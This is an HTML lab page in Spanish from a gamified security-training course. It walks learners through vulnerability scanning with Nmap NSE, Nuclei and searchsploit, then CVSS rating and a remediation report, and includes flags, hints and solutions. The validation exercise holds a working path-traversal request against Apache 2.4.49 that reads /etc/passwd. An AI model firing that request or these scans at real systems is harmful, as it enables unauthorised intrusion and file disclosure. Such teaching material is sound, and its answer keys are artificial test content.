@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ Análisis de Vulnerabilidades — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+
+    <script>
+    const LAB_CONFIG = {
+        id: 'vulnscan-01',
+        name: 'Análisis de Vulnerabilidades',
+        subtitle: 'Nuclei, Nmap NSE, searchsploit y clasificación CVSS',
+        icon: '🛡️',
+        difficulty: 'intermedio',
+        totalXP: 300,
+        time: '60 min',
+        exercises: [
+            {
+                title: 'Escaneo Nmap con Scripts NSE',
+                xp: 50,
+                objective: 'Detecta vulnerabilidades usando los scripts NSE de Nmap contra la red objetivo.',
+                steps: [
+                    'Escaneo completo de vulnerabilidades: <code>nmap -sV --script vuln 10.0.3.0/24</code>',
+                    'Scripts específicos: <code>nmap --script http-vuln-cve2017-5638 -p 80 10.0.3.10</code>',
+                    'Detección de software obsoleto: <code>nmap --script http-generator -p 80 10.0.3.10</code>',
+                    'Documenta cada CVE encontrado'
+                ],
+                code: `<span class="command">nmap -sV --script vuln 10.0.3.0/24 -oN nmap_vuln.txt</span>\n\n<span class="output">10.0.3.10:</span>\n<span class="flag">| http-vuln-cve2021-41773: Apache Path Traversal</span>\n<span class="flag">| CVE-2021-41773 (9.8 CRÍTICO)</span>\n\n<span class="output">10.0.3.40:</span>\n<span class="flag">| ssh-hostkey: OpenSSH 7.2 (obsoleto)</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{nmap_nse_vulns_detected}',
+                hint: 'Apache 2.4.49 tiene CVE-2021-41773 (Path Traversal/RCE).',
+                solution: 'Nmap NSE detecta: CVE-2021-41773 en Apache, PHP obsoleto, MySQL 5.7 con creds débiles, OpenSSH 7.2.'
+            },
+            {
+                title: 'Escaneo con Nuclei',
+                xp: 60,
+                objective: 'Usa Nuclei para escaneo automatizado y discover de tecnologías.',
+                steps: [
+                    'Escaneo básico: <code>nuclei -u http://10.0.3.10 -o nuclei_results.txt</code>',
+                    'Por severidad: <code>nuclei -u http://10.0.3.10 -severity critical,high</code>',
+                    'Detección de tech: <code>nuclei -u http://10.0.3.10 -tags tech</code>',
+                    'Crea lista de targets y escanea la red completa'
+                ],
+                code: `<span class="command">nuclei -u http://10.0.3.10 -severity critical,high -o nuclei_critical.txt</span>\n\n<span class="flag">[critical] [apache-path-traversal] Apache 2.4.49 Path Traversal</span>\n<span class="flag">[high] [php-exposed] PHP info exposed</span>\n<span class="output">[medium] [server-status-exposed] Server status exposed</span>\n\n<span class="command">nuclei -u http://10.0.3.10 -tags tech</span>\n<span class="output">[tech] [apache] Apache/2.4.49</span>\n<span class="output">[tech] [php] PHP/7.2.34</span>\n<span class="output">[tech] [mysql] MySQL</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{nuclei_critical_high_found}',
+                hint: 'Nuclei ejecuta 5000+ templates. Filtra por severity para priorizar.',
+                solution: 'Nuclei encuentra: apache-path-traversal (critical), php-exposed (high), server-status (medium).'
+            },
+            {
+                title: 'Searchsploit — Exploit-DB',
+                xp: 50,
+                objective: 'Busca exploits públicos para cada vulnerabilidad encontrada.',
+                steps: [
+                    'Busca por software: <code>searchsploit apache 2.4.49</code>',
+                    'Busca por CVE: <code>searchsploit CVE-2021-41773</code>',
+                    'Exporta resultados: <code>searchsploit -w apache 2.4.49</code>',
+                    'Identifica los más relevantes (RCE, privilege escalation)'
+                ],
+                code: `<span class="command">searchsploit apache 2.4.49</span>\n<span class="flag">Apache 2.4.49 - Path Traversal/RCE (49406)</span>\n\n<span class="command">searchsploit CVE-2021-41773</span>\n<span class="flag">Apache HTTP Server 2.4.49 - Path Traversal (49406)</span>\n\n<span class="command">searchsploit nginx 1.18</span>\n<span class="output">No Results</span>\n\n<span class="command">searchsploit openssh 7.2</span>\n<span class="output">OpenSSH 7.2 - User Enumeration (40358)</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{searchsploit_exploits_found}',
+                hint: 'searchsploit busca en Exploit-DB. Apache 2.4.49 tiene exploit de Path Traversal/RCE.',
+                solution: 'searchsploit encuentra: Apache 2.4.49 (49406 - Path Traversal), OpenSSH 7.2 (40358 - User Enum).'
+            },
+            {
+                title: 'Clasificación CIA + CVSS v3.1',
+                xp: 60,
+                objective: 'Clasifica cada vulnerabilidad usando la tríada CIA y calcula el CVSS.',
+                steps: [
+                    'Usa el calculator de FIRST: https://www.first.org/cvss/calculator/3.1',
+                    'Evalúa impacto en C (Confidencialidad), I (Integridad), D (Disponibilidad)',
+                    'Calcula score CVSS para cada hallazgo',
+                    'Clasifica por severidad: CRÍTICO (9-10), ALTO (7-8.9), MEDIO (4-6.9), BAJO (0-3.9)'
+                ],
+                code: `<span class="comment"># Ejemplo de clasificación</span>\n\n<span class="flag">| CVE | Vulnerabilidad | CIA | CVSS | Severidad |</span>\n<span class="flag">|-----|---------------|-----|------|-----------|</span>\n<span class="flag">| CVE-2021-41773 | Apache Path Traversal | C:I:A | 9.8 | CRÍTICO |</span>\n<span class="flag">| CVE-2017-5638 | Apache Struts RCE | C:I:A | 10.0 | CRÍTICO |</span>\n<span class="output">| Info | PHP Exposed | C | 5.3 | MEDIO |</span>\n<span class="output">| Info | Server Status | C | 3.7 | BAJO |</span>`,
+                codeLang: 'markdown',
+                flag: 'FLAG{cia_cvss_classification_done}',
+                hint: 'Path Traversal con RCE = 9.8 CVSS (Confidentiality + Integrity + Availability impact).',
+                solution: '2 vulnerabilidades CRÍTICAS (CVSS 9.8, 10.0), 1 MEDIA (5.3), 1 BAJA (3.7).'
+            },
+            {
+                title: 'Validación de Vulnerabilidades',
+                xp: 40,
+                objective: 'Confirma que las vulnerabilidades son realmente explotables.',
+                steps: [
+                    'Prueba Path Traversal: <code>curl "http://10.0.3.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"</code>',
+                    'Verifica archivos expuestos: <code>curl http://10.0.3.10/phpinfo.php</code>',
+                    'Enumera directorios: <code>gobuster dir -u http://10.0.3.10 -w common.txt</code>',
+                    'Documenta evidencia de cada hallazgo'
+                ],
+                code: `<span class="command">curl "http://10.0.3.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>\n<span class="flag">root:x:0:0:root:/root:/bin/bash</span>\n<span class="flag">✓ Path Traversal CONFIRMADO</span>\n\n<span class="command">curl http://10.0.3.10/phpinfo.php</span>\n<span class="flag">PHP Version 7.2.34 — expuesto en producción</span>\n\n<span class="command">curl http://10.0.3.10/server-status</span>\n<span class="flag">Apache Server Status — sin autenticación</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{vulns_validated_exploitable}',
+                hint: 'El Path Traversal lee /etc/passwd = confirmación de explotación.',
+                solution: 'Path Traversal: lee /etc/passwd. phpinfo.php expone config. server-status sin auth.'
+            },
+            {
+                title: 'Informe de Vulnerabilidades',
+                xp: 40,
+                objective: 'Crea un reporte profesional con metodología y plan de remediación.',
+                steps: [
+                    'Crea <code>vuln_report.md</code>',
+                    'Incluye Resumen Ejecutivo con métricas',
+                    'Documenta cada vuln con CVE, CVSS, CIA',
+                    'Crea Plan de Remediación priorizado (P1/P2/P3)'
+                ],
+                code: `<span class="comment"># Informe de Análisis de Vulnerabilidades</span>\n\n<span class="comment">## Resumen Ejecutivo</span>\n- Total: 4 vulnerabilidades\n- <span class="flag">Críticas: 2 | Altas: 0 | Medias: 1 | Bajas: 1</span>\n- Riesgo general: <span class="flag">ALTO</span>\n\n<span class="comment">## Plan de Remediación</span>\n<span class="flag">| P1 | Apache Path Traversal | Actualizar Apache a 2.4.51+ | 24h |</span>\n<span class="flag">| P2 | PHP obsoleto | Actualizar PHP a 8.1 | 7 días |</span>\n<span class="output">| P3 | Server Status expuesto | Deshabilitar o autenticar | 30 días |</span>`,
+                codeLang: 'markdown',
+                flag: 'FLAG{vuln_report_professional}',
+                hint: 'Un buen reporte tiene: Resumen, Metodología, Hallazgos con CVSS, Plan de Remediación.',
+                solution: 'Reporte completo: 2 críticos (Apache, Struts), 1 medio (PHP info), 1 bajo (server-status).'
+            }
+        ]
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        CDPN_LabRunner.init(LAB_CONFIG);
+    });
+    </script>
+</body>
+</html>
